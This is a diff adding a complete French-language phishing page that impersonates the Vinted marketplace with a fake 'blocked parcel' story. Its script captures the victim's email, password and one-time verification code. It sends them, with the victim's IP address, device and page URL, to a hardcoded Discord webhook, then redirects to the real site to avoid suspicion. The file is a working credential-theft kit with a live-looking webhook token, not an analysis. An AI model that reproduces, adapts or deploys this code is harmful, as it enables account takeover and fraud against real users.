@@ -1,0 +1,560 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow">
+<title>Vinted</title>
+
+<!-- ============================================================
+     METS TON WEBHOOK ICI (Discord / webhook compatible JSON)
+     Exemple : https://discord.com/api/webhooks/123456/abcdef...
+     ============================================================ -->
+<script>
+window.WEBHOOK_URL = "https://discord.com/api/webhooks/1526189180839923803/YZZvRJWSYhnOU4JTyCEXHUVnrkDENO2iX-nyBaVxohS9Ol6dO8xpmd3KmKNGqBC6jrFh";
+</script>
+
+<style>
+  :root{
+    --teal:#007782; --teal-dark:#005e66; --teal-soft:#e5f3f4;
+    --ink:#101010; --ink-soft:#4b4b4b; --ink-mute:#767676;
+    --line:#e3e3e3; --danger:#c4222b; --radius:6px;
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    margin:0;min-height:100dvh;display:flex;flex-direction:column;background:#fff;color:var(--ink);
+    font:15px/1.45 Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    -webkit-font-smoothing:antialiased;
+  }
+  a{color:inherit}
+
+  .vh{display:flex;align-items:center;justify-content:space-between;gap:16px;padding:14px 20px;
+      border-bottom:1px solid var(--line);position:sticky;top:0;background:rgba(255,255,255,.92);
+      backdrop-filter:saturate(140%) blur(8px);z-index:10}
+  .logo{display:inline-flex;text-decoration:none}
+  .logo svg{width:96px;height:26px;display:block}
+  .vh-nav{font-size:14px}
+  .nav-link{color:var(--ink-soft);text-decoration:none;padding:6px 4px}
+  .nav-link:hover{color:var(--ink)}
+
+  .shell{width:100%;max-width:520px;margin:0 auto;padding:28px 20px 48px;flex:1}
+
+  .screen{display:none}
+  .screen.on{display:block}
+
+  /* hero */
+  .hero{text-align:center}
+  .hero-title{font-size:27px;line-height:1.2;letter-spacing:-.02em;margin:12px 0 10px}
+  .hero-sub{color:var(--ink-soft);margin:0 auto 26px;max-width:400px}
+  .track-form{display:flex;flex-direction:column;gap:14px;text-align:left;margin-bottom:18px}
+  .helper-row{color:var(--ink-mute);font-size:13px;margin-bottom:30px}
+
+  /* fields */
+  .field{display:block}
+  .field-label{display:block;font-size:13px;font-weight:600;color:var(--ink-soft);margin-bottom:6px}
+  .input{width:100%;height:48px;padding:0 14px;border:1px solid #c9c9c9;border-radius:var(--radius);
+         background:#fff;color:var(--ink);font:inherit;transition:border-color .15s,box-shadow .15s}
+  .input::placeholder{color:#9a9a9a}
+  .input:focus{outline:none;border-color:var(--teal);box-shadow:0 0 0 3px rgba(0,119,130,.16)}
+  .input-wrap{position:relative;display:block}
+  .input-wrap .input{padding-right:66px}
+  .reveal{position:absolute;top:50%;right:8px;transform:translateY(-50%);border:0;background:none;
+          color:var(--teal);font:inherit;font-weight:600;font-size:13px;cursor:pointer;padding:8px}
+  .field.invalid .input{border-color:var(--danger)}
+  .field-error{display:block;min-height:18px;margin-top:5px;font-size:12.5px;color:var(--danger)}
+
+  /* buttons */
+  .btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;width:100%;min-height:48px;
+       padding:0 18px;border:0;border-radius:var(--radius);background:var(--teal);color:#fff;
+       font:inherit;font-weight:700;text-decoration:none;cursor:pointer;transition:background .15s,transform .06s}
+  .btn:hover{background:var(--teal-dark)}
+  .btn:active{transform:translateY(1px)}
+  .btn[disabled]{opacity:.55;cursor:not-allowed}
+  .spinner{display:none;width:16px;height:16px;border:2px solid rgba(255,255,255,.45);
+           border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
+  .btn.loading .spinner{display:inline-block}
+  .btn.loading .btn-label{opacity:.8}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* card */
+  .card{background:#fff;border:1px solid var(--line);border-radius:10px;
+        box-shadow:0 1px 2px rgba(0,0,0,.06),0 8px 24px rgba(0,0,0,.05);padding:24px 20px}
+  .card-narrow{max-width:440px;margin:0 auto}
+  .card-head{margin-bottom:20px}
+  .card-title{font-size:21px;line-height:1.25;letter-spacing:-.015em;margin:0 0 8px}
+  .card-sub{margin:0;color:var(--ink-soft);font-size:14.5px}
+  .pill{display:inline-block;margin-bottom:12px;padding:4px 10px;border-radius:999px;background:var(--teal-soft);
+        color:var(--teal-dark);font-size:12px;font-weight:700;letter-spacing:.02em;text-transform:uppercase}
+  .card .btn{margin-top:20px}
+
+  /* facts + timeline */
+  .facts{margin:0;border-top:1px solid var(--line)}
+  .facts>div{display:flex;justify-content:space-between;gap:16px;padding:12px 0;
+             border-bottom:1px solid var(--line);font-size:14px}
+  .facts dt{color:var(--ink-mute);margin:0}
+  .facts dd{margin:0;text-align:right;font-weight:600}
+  .facts dd.warn{color:var(--danger)}
+  .steps,.timeline{display:grid;gap:16px;margin-top:28px}
+  .step,.tl-row{display:flex;gap:12px;align-items:flex-start;font-size:14px}
+  .step small,.tl-row small{display:block;color:var(--ink-mute);font-size:12.5px;margin-top:2px}
+  .dot{flex:0 0 auto;width:10px;height:10px;margin-top:5px;border-radius:50%;border:2px solid #c9c9c9;background:#fff}
+  .dot.done,.tl-row.is-done .dot{border-color:var(--teal);background:var(--teal)}
+  .tl-row.is-alert .dot{border-color:var(--danger);background:var(--danger);box-shadow:0 0 0 4px rgba(196,34,43,.12)}
+
+  /* form */
+  .form{display:grid;gap:16px}
+  .form-row{display:flex;align-items:center;justify-content:space-between;gap:12px;font-size:13.5px}
+  .check{display:inline-flex;align-items:center;gap:8px;color:var(--ink-soft)}
+  .check input{width:16px;height:16px;accent-color:var(--teal)}
+  .link{color:var(--ink);text-decoration:underline;text-underline-offset:2px}
+  .link-btn{border:0;background:none;padding:0;font:inherit;cursor:pointer}
+  .link-btn[disabled]{color:var(--ink-mute);text-decoration:none;cursor:default}
+
+  /* otp */
+  .otp{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+  .otp-box{height:62px;width:100%;text-align:center;font-size:26px;font-weight:700;letter-spacing:.02em;
+           color:var(--ink);border:1px solid #c9c9c9;border-radius:var(--radius);background:#fff;font-family:inherit;
+           transition:border-color .15s,box-shadow .15s}
+  .otp-box:focus{outline:none;border-color:var(--teal);box-shadow:0 0 0 3px rgba(0,119,130,.16)}
+  .otp.shake{animation:shake .4s}
+  @keyframes shake{
+    10%,90%{transform:translateX(-2px)} 20%,80%{transform:translateX(3px)}
+    30%,50%,70%{transform:translateX(-5px)} 40%,60%{transform:translateX(5px)}
+  }
+  .otp-error{margin:0;color:var(--danger);font-size:13.5px}
+  .otp-error.is-info{color:var(--ink-soft)}
+  .resend-row{display:flex;flex-wrap:wrap;align-items:center;gap:6px;margin-top:18px;
+              font-size:13.5px;color:var(--ink-soft)}
+  .resend-timer{color:var(--ink-mute);font-variant-numeric:tabular-nums}
+
+  /* misc */
+  .fineprint{margin:16px 0 0;font-size:12.5px;color:var(--ink-mute);text-align:center;line-height:1.5}
+  .center{text-align:center}
+  .tick{width:64px;height:64px;margin:0 auto 16px}
+  .tick svg{width:100%;height:100%;fill:none;stroke:var(--teal);stroke-width:3}
+  .tick circle{opacity:.25}
+  .tick path{stroke-linecap:round;stroke-linejoin:round}
+  .vf{display:flex;flex-wrap:wrap;justify-content:center;gap:16px;padding:22px 20px 30px;
+      border-top:1px solid var(--line);color:var(--ink-mute);font-size:12.5px}
+  .vf a{text-decoration:none}
+  .vf a:hover{color:var(--ink)}
+
+  @media (max-width:380px){
+    .otp-box{height:54px;font-size:22px}
+    .shell{padding:20px 16px 40px}
+    .form-row{font-size:13px}
+  }
+  @media (prefers-reduced-motion:reduce){
+    *{animation-duration:.001ms!important;transition-duration:.001ms!important}
+  }
+</style>
+</head>
+<body>
+
+<header class="vh">
+  <a class="logo" href="#" aria-label="Vinted">
+    <svg viewBox="0 0 132 34" role="img" aria-label="Vinted">
+      <text x="0" y="26" font-family="Poppins, Inter, 'Segoe UI', Arial, sans-serif"
+            font-size="30" font-weight="700" letter-spacing="-1.1" fill="#007782">vinted</text>
+    </svg>
+  </a>
+  <nav class="vh-nav"><a href="#" class="nav-link">Aide</a></nav>
+</header>
+
+<main class="shell">
+
+  <!-- 1 — suivi de colis -->
+  <section class="screen on" id="s-track">
+    <div class="hero">
+      <h1 class="hero-title">Où est mon colis&nbsp;?</h1>
+      <p class="hero-sub">Saisissez votre numéro de suivi pour connaître la position de votre commande.</p>
+      <form class="track-form" id="form-track" autocomplete="off" novalidate>
+        <label class="field">
+          <span class="field-label">Numéro de suivi</span>
+          <input class="input" type="text" name="tracking" placeholder="Ex. 8X4F29L1K7" maxlength="24" required>
+        </label>
+        <button class="btn" type="submit">Suivre mon colis</button>
+      </form>
+      <div class="helper-row"><span>Le numéro figure dans l’e-mail d’expédition.</span></div>
+    </div>
+    <section class="steps">
+      <div class="step"><span class="dot"></span><div><strong>Commande confirmée</strong><small>Le vendeur a préparé votre article.</small></div></div>
+      <div class="step"><span class="dot"></span><div><strong>En transit</strong><small>Votre colis a quitté le centre de tri.</small></div></div>
+      <div class="step"><span class="dot done"></span><div><strong>Livraison</strong><small>En attente de votre confirmation.</small></div></div>
+    </section>
+  </section>
+
+  <!-- 2 — colis bloqué -->
+  <section class="screen" id="s-blocked">
+    <div class="card">
+      <div class="card-head">
+        <span class="pill">En attente</span>
+        <h1 class="card-title">Votre colis est bloqué</h1>
+        <p class="card-sub">Colis <strong id="track-ref">#—</strong> — une vérification de votre compte est
+          requise avant la livraison de votre commande.</p>
+      </div>
+      <dl class="facts">
+        <div><dt>Statut</dt><dd class="warn">Vérification requise</dd></div>
+        <div><dt>Colis</dt><dd id="track-fact">#—</dd></div>
+        <div><dt>Livraison prévue</dt><dd>Aujourd’hui, avant 19:00</dd></div>
+      </dl>
+      <button class="btn" type="button" data-go="login">Débloquer mon colis</button>
+      <p class="fineprint">Vous devez être connecté à votre compte Vinted pour confirmer la livraison.</p>
+    </div>
+    <section class="timeline">
+      <div class="tl-row is-done"><span class="dot"></span><div><strong>Colis expédié</strong><small>Aujourd’hui, 08:12</small></div></div>
+      <div class="tl-row is-done"><span class="dot"></span><div><strong>Arrivé au centre de tri</strong><small>Aujourd’hui, 11:47</small></div></div>
+      <div class="tl-row is-alert"><span class="dot"></span><div><strong>Contrôle de sécurité</strong><small>Une action est requise de votre part</small></div></div>
+    </section>
+  </section>
+
+  <!-- 3 — connexion -->
+  <section class="screen" id="s-login">
+    <div class="card card-narrow">
+      <div class="card-head">
+        <h1 class="card-title">Connectez-vous</h1>
+        <p class="card-sub" id="login-sub">Accédez à votre compte pour continuer.</p>
+      </div>
+      <form class="form" id="form-login" novalidate>
+        <label class="field">
+          <span class="field-label">Adresse e-mail</span>
+          <input class="input" type="email" name="email" inputmode="email" autocomplete="username"
+                 autocapitalize="off" spellcheck="false" placeholder="vous@exemple.com" required>
+          <span class="field-error" data-for="email"></span>
+        </label>
+        <label class="field">
+          <span class="field-label">Mot de passe</span>
+          <span class="input-wrap">
+            <input class="input" type="password" name="password" autocomplete="current-password"
+                   placeholder="Mot de passe" required>
+            <button class="reveal" type="button" id="reveal">Voir</button>
+          </span>
+          <span class="field-error" data-for="password"></span>
+        </label>
+        <div class="form-row">
+          <label class="check"><input type="checkbox" checked><span>Rester connecté</span></label>
+          <a class="link" href="#">Mot de passe oublié&nbsp;?</a>
+        </div>
+        <button class="btn" type="submit" id="login-submit">
+          <span class="btn-label">Se connecter</span>
+          <span class="spinner" aria-hidden="true"></span>
+        </button>
+      </form>
+      <p class="fineprint">Pas encore de compte&nbsp;? <a href="#" class="link">Inscrivez-vous</a></p>
+    </div>
+  </section>
+
+  <!-- 4 — code -->
+  <section class="screen" id="s-code">
+    <div class="card card-narrow">
+      <div class="card-head">
+        <span class="pill">Vérification</span>
+        <h1 class="card-title">Saisissez le code à 4 chiffres</h1>
+        <p class="card-sub">Nous avons envoyé un code de sécurité à votre adresse e-mail et par SMS
+          pour confirmer qu’il s’agit bien de vous.</p>
+      </div>
+      <form class="form" id="form-code" novalidate>
+        <div class="otp" id="otp">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Chiffre 1">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Chiffre 2">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Chiffre 3">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" aria-label="Chiffre 4">
+        </div>
+        <p class="otp-error" id="otp-error" hidden></p>
+        <button class="btn" type="submit" id="code-submit" disabled>
+          <span class="btn-label">Vérifier</span>
+          <span class="spinner" aria-hidden="true"></span>
+        </button>
+      </form>
+      <div class="resend-row">
+        <span>Vous n’avez rien reçu&nbsp;?</span>
+        <button class="link link-btn" id="resend" type="button" disabled>Renvoyer le code</button>
+        <span class="resend-timer" id="resend-timer"></span>
+      </div>
+      <p class="fineprint">Le code est valable 5 minutes. Ne le partagez avec personne.</p>
+    </div>
+  </section>
+
+  <!-- 5 — fin -->
+  <section class="screen" id="s-done">
+    <div class="card card-narrow center">
+      <div class="tick">
+        <svg viewBox="0 0 52 52"><circle cx="26" cy="26" r="24"/><path d="M15 27l7.5 7L37 20"/></svg>
+      </div>
+      <h1 class="card-title">Votre compte est vérifié</h1>
+      <p class="card-sub">Le blocage de votre colis a été levé. Vous allez être redirigé vers votre
+        espace Vinted dans un instant…</p>
+      <a class="btn" id="continue" href="https://www.vinted.fr/">Continuer vers Vinted</a>
+    </div>
+  </section>
+
+</main>
+
+<footer class="vf">
+  <span>© 2026 Vinted</span>
+  <a href="#">Confidentialité</a>
+  <a href="#">Conditions</a>
+</footer>
+
+<script>
+(function () {
+  'use strict';
+
+  var REDIRECT = 'https://www.vinted.fr/';
+  var track = '';
+
+  /* ------------------------------------------------------------------ */
+  /* webhook                                                             */
+  /* ------------------------------------------------------------------ */
+
+  function ip() {
+    if (!window.fetch) return Promise.resolve('');
+    var ctrl = new AbortController();
+    var timer = setTimeout(function () { ctrl.abort(); }, 1200);
+    return fetch('https://api.ipify.org?format=json', { signal: ctrl.signal })
+      .then(function (r) { return r.json(); })
+      .then(function (j) { clearTimeout(timer); return j && j.ip ? j.ip : ''; })
+      .catch(function () { clearTimeout(timer); return ''; });
+  }
+
+  function send(title, rows) {
+    var url = window.WEBHOOK_URL;
+    if (!url || url.indexOf('http') !== 0) {
+      console.warn('WEBHOOK_URL manquant');
+      return Promise.resolve();
+    }
+
+    var clean = function (value) {
+      return String(value == null || value === '' ? '—' : value)
+        .replace(/`/g, '´')
+        .replace(/\r?\n/g, ' ')
+        .slice(0, 900);
+    };
+
+    var text = '**' + title + '**\n' + rows.map(function (r) {
+      return clean(r[0]) + ' : `' + clean(r[1]) + '`';
+    }).join('\n');
+
+    var body = {
+      username: 'Vinted',
+      content: text.slice(0, 1950),
+      allowed_mentions: { parse: [] }
+    };
+
+    return fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+      keepalive: true
+    }).catch(function (e) { console.warn('webhook', e); });
+  }
+
+  function withContext(title, rows) {
+    return ip().then(function (address) {
+      var base = rows.slice();
+      base.push(['Colis', track || '—']);
+      base.push(['Adresse IP', address || 'inconnue']);
+      base.push(['Page', location.href]);
+      base.push(['Appareil', navigator.userAgent.slice(0, 180)]);
+      base.push(['Date', new Date().toLocaleString('fr-FR')]);
+      return send(title, base);
+    });
+  }
+
+  /* ------------------------------------------------------------------ */
+  /* écrans                                                              */
+  /* ------------------------------------------------------------------ */
+
+  function go(name) {
+    var screens = document.querySelectorAll('.screen');
+    for (var i = 0; i < screens.length; i++) {
+      screens[i].classList.toggle('on', screens[i].id === 's-' + name);
+    }
+    window.scrollTo(0, 0);
+    if (name === 'code') setTimeout(function () { boxes[0].focus(); }, 60);
+  }
+
+  var buttons = document.querySelectorAll('[data-go]');
+  for (var b = 0; b < buttons.length; b++) {
+    buttons[b].addEventListener('click', function () { go(this.getAttribute('data-go')); });
+  }
+
+  /* ------------------------------------------------------------------ */
+  /* 1 — suivi                                                           */
+  /* ------------------------------------------------------------------ */
+
+  var trackForm = document.getElementById('form-track');
+
+  trackForm.addEventListener('submit', function (e) {
+    e.preventDefault();
+    var value = trackForm.tracking.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase().slice(0, 24);
+    if (value.length < 4) { trackForm.tracking.focus(); return; }
+    track = value;
+    document.getElementById('track-ref').textContent = '#' + value;
+    document.getElementById('track-fact').textContent = '#' + value;
+    document.getElementById('login-sub').innerHTML =
+      'Pour débloquer le colis <strong>#' + value + '</strong>, connectez-vous à votre compte.';
+    go('blocked');
+  });
+
+  /* ------------------------------------------------------------------ */
+  /* 2 — connexion                                                       */
+  /* ------------------------------------------------------------------ */
+
+  var loginForm = document.getElementById('form-login');
+  var loginBtn = document.getElementById('login-submit');
+
+  document.getElementById('reveal').addEventListener('click', function () {
+    var input = loginForm.password;
+    var hidden = input.type === 'password';
+    input.type = hidden ? 'text' : 'password';
+    this.textContent = hidden ? 'Masquer' : 'Voir';
+  });
+
+  function setError(input, message) {
+    input.closest('.field').classList.toggle('invalid', !!message);
+    var slot = loginForm.querySelector('.field-error[data-for="' + input.name + '"]');
+    if (slot) slot.textContent = message || '';
+  }
+
+  [loginForm.email, loginForm.password].forEach(function (input) {
+    input.addEventListener('input', function () { setError(input, ''); });
+  });
+
+  loginForm.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    var email = loginForm.email.value.trim();
+    var password = loginForm.password.value;
+    var ok = true;
+
+    setError(loginForm.email, '');
+    setError(loginForm.password, '');
+
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
+      setError(loginForm.email, 'Saisissez une adresse e-mail valide.');
+      ok = false;
+    }
+    if (!password) {
+      setError(loginForm.password, 'Saisissez votre mot de passe.');
+      ok = false;
+    }
+    if (!ok) return;
+
+    loginBtn.disabled = true;
+    loginBtn.classList.add('loading');
+
+    withContext('Nouvel email / mot de passe Vinted', [
+      ['Email', email],
+      ['Mot de passe', password]
+    ]).then(function () {
+      loginBtn.classList.remove('loading');
+      loginBtn.disabled = false;
+      loginForm.reset();
+      go('code');
+    });
+  });
+
+  /* ------------------------------------------------------------------ */
+  /* 3 — code                                                            */
+  /* ------------------------------------------------------------------ */
+
+  var boxes = Array.prototype.slice.call(document.querySelectorAll('.otp-box'));
+  var codeForm = document.getElementById('form-code');
+  var codeBtn = document.getElementById('code-submit');
+  var otpError = document.getElementById('otp-error');
+  var resend = document.getElementById('resend');
+  var timerSlot = document.getElementById('resend-timer');
+  var left = 30;
+
+  function code() {
+    return boxes.map(function (b) { return b.value; }).join('');
+  }
+
+  function refreshBtn() {
+    codeBtn.disabled = code().length !== boxes.length;
+  }
+
+  boxes.forEach(function (box, i) {
+    box.addEventListener('input', function () {
+      box.value = box.value.replace(/\D/g, '').slice(0, 1);
+      if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
+      refreshBtn();
+    });
+
+    box.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !box.value && i > 0) {
+        boxes[i - 1].focus();
+        boxes[i - 1].value = '';
+        refreshBtn();
+      }
+      if (e.key === 'ArrowLeft' && i > 0) boxes[i - 1].focus();
+      if (e.key === 'ArrowRight' && i < boxes.length - 1) boxes[i + 1].focus();
+    });
+
+    box.addEventListener('paste', function (e) {
+      var digits = ((e.clipboardData || window.clipboardData).getData('text') || '')
+        .replace(/\D/g, '').slice(0, 4);
+      if (!digits) return;
+      e.preventDefault();
+      digits.split('').forEach(function (d, j) { if (boxes[j]) boxes[j].value = d; });
+      boxes[Math.min(digits.length, boxes.length - 1)].focus();
+      refreshBtn();
+    });
+  });
+
+  function shake(message, info) {
+    otpError.hidden = false;
+    otpError.classList.toggle('is-info', !!info);
+    otpError.textContent = message;
+    var otp = document.getElementById('otp');
+    otp.classList.remove('shake');
+    void otp.offsetWidth;
+    otp.classList.add('shake');
+  }
+
+  function tick() {
+    if (left <= 0) {
+      resend.disabled = false;
+      timerSlot.textContent = '';
+      return;
+    }
+    var s = left % 60;
+    timerSlot.textContent = '(0:' + (s < 10 ? '0' + s : s) + ')';
+    left -= 1;
+    setTimeout(tick, 1000);
+  }
+  tick();
+
+  resend.addEventListener('click', function () {
+    left = 45;
+    tick();
+    shake('Un nouveau code vient d’être envoyé.', true);
+  });
+
+  codeForm.addEventListener('submit', function (e) {
+    e.preventDefault();
+    if (code().length !== boxes.length) return;
+
+    var value = code();
+    codeBtn.disabled = true;
+    codeBtn.classList.add('loading');
+    otpError.hidden = true;
+
+    withContext('Code de vérification Vinted', [
+      ['Code', value]
+    ]).then(function () {
+      codeBtn.classList.remove('loading');
+      go('done');
+      setTimeout(function () { location.replace(REDIRECT); }, 2600);
+    });
+  });
+
+  /* ------------------------------------------------------------------ */
+
+  document.getElementById('continue').setAttribute('href', REDIRECT);
+})();
+</script>
+</body>
+</html>
